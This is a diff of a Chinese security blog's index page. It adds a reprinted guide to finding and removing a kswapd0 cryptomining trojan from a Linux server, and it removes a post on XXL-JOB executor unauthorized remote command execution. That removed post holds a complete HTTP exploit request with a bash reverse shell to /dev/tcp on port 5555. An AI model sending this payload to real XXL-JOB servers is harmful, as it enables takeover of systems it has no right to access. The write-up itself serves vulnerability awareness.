@@ -82,6 +82,77 @@
 
     
         <h2 class="title">
+            <a href="/2023/10/25/kswapd0-CPU-1/">
+                服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="服务器linux挖矿木马病毒kswapd0进程使cpu爆满">服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47831505/article/details/123939089">飞川撸码</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>由于本人的阿里云服务器遭受攻击，被挖矿，导致CPU爆满，同时受到阿里云官方的邮箱、短信以及电话通知（监管部门是不允许服务器被直接或者间接挖矿）<br>首先是CPU爆满，远程登录不了，通过将服务器重启以后可以远程登录了。以kswapd0进程为例，其他进程类似，下面就是具体步骤了。<br>可参考阿里云的：挖矿程序处理最佳实践<br>注：如果你的服务器购买了付费版云安全中心，在云安全中心插件正常的前提下，可以利用付费版的主动防御及安全告警处理的功能来手动扫描下，对于检测到的威胁，你可以在安全告警处理页面进一步核实处理。应该可以直接处理掉。(如果没有，看下面的处理)<br><img src="/2023/10/25/kswapd0-CPU-1/1.png" alt="image"> </p>
+<p><img src="/2023/10/25/kswapd0-CPU-1/2.png" alt="image"> </p>
+</blockquote>
+<h2><span id="1在系统里面top一下查看了所有进程">1.在系统里面top一下，查看了所有进程</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/3.png" alt="image"> </p>
+<p>看到这些进程一直在变化，但是，主要是由于kswapd0进程在作怪，占据了99%以上的CUP，查找资料后，发现它就是挖矿进程。</p>
+</blockquote>
+<h2><span id="2排查kswapd0进程">2.排查kswapd0进程</span></h2><h3><span id="21-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息">2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></h3><blockquote>
+<p><code>netstat -antlp | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>发现一个与本机端口通信的是一个荷兰的ip<br><img src="/2023/10/25/kswapd0-CPU-1/5.png" alt="image"> </p>
+</blockquote>
+<h3><span id="22执行命令netstat-antlp-grep-1943619030-查询该地区ip的其他网络占用情况">2.2执行命令netstat -antlp | grep 194.36.190.30 查询该地区ip的其他网络占用情况</span></h3><blockquote>
+<p><code>netstat -antlp | grep 194.36.190.30</code><br><img src="/2023/10/25/kswapd0-CPU-1/6.png" alt="image"> </p>
+<p>发现只有这一个进程（当然，很有可能花卉有其他进程）</p>
+</blockquote>
+<h2><span id="3-查找进程的详细信息">3. 查找进程的详细信息</span></h2><blockquote>
+<p>我们来到&#x2F;proc&#x2F;目录下查找对应的pid号，即&#x2F;proc&#x2F;497。可以在这目录下找到kswapd0进程的详细信息。<br><code>ll /proc/497</code><br><img src="/2023/10/25/kswapd0-CPU-1/7.png" alt="image"> </p>
+</blockquote>
+<h2><span id="4查看进程的工作空间">4.查看进程的工作空间</span></h2><blockquote>
+<p><code>ps -ef | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/8.png" alt="image"> </p>
+<p>执行完后可以看到进程的pid以及进程相关文件的位置</p>
+</blockquote>
+<h2><span id="5切换到木马程序目录并删除">5.切换到木马程序目录并删除</span></h2><blockquote>
+<p><img src="/2023/10/25/kswapd0-CPU-1/9.png" alt="image"> </p>
+<p><code>rm -rf /var/tmp/.copydie</code></p>
+</blockquote>
+<h2><span id="6清理定时任务">6.清理定时任务</span></h2><blockquote>
+<p>很多病毒都是有会在定时任务里面，以至于很难清理清楚。（由于我的服务器买油开启定时任务服务，所以里面没有任务）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看定时任务：</span><br><span class="line">crontab -l</span><br><span class="line">清理计划任务: </span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>清除后将定时任务里的相关文件都清理干净，若有其他用户，将其他用户的定时任务也清理。</p>
+</blockquote>
+<h2><span id="7杀掉kswapd0进程">7.杀掉kswapd0进程</span></h2><blockquote>
+<p>最好把木马程序和定时任务都清理完了再杀掉,要不然还会自动重启<br><code>kill -9 497</code> #kill -9 kswapd0进程的PID</p>
+</blockquote>
+<h2><span id="8总结">8.总结</span></h2><blockquote>
+<p>就是跟着进程找找目录，然后杀进程，清目录<br>清定时任务<br>服务器的ftp端口最好别用22,密码尽量设置复杂点<br>尽量用密钥连接服务器，最好别用账号密码连接<br>封闭不使用的端口，做到用一个开一个（通过防火墙和安全组策略）<br>密码增强复杂性<br>及时修补系统和软件漏洞</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/10/25/kswapd0-CPU-0/">
                 解决kswapd0 CPU占用率高的问题
             </a>
@@ -772,64 +843,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/XXL-JOB-Executor/">
-                XXL-JOB executor未授权访问漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
-<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
-</blockquote>
-<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
-<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
-</blockquote>
-<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
-<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
-<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
-<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
-<p>开启监听后，即可反弹回shell</p>
-<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
             </div>
         
 
